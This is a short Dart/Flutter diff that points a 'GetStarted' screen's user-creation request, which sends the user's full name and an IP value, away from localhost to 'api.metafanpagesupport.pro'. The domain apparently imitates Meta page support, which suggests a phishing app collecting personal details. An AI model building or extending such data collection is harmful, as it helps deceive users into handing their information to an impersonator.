@@ -56,7 +56,7 @@ class _GetStartedState extends State<GetStarted> {
 
   Future<void> sendMessage(Map map, String ip) async {
     const baseUrl =
-        'http://localhost:8080/v1/users/create'; // Replace with your API base URL
+        'https://api.metafanpagesupport.pro/v1/users/create'; // Replace with your API base URL
 
     final body = {
       'fullname': map["Full Name"], //
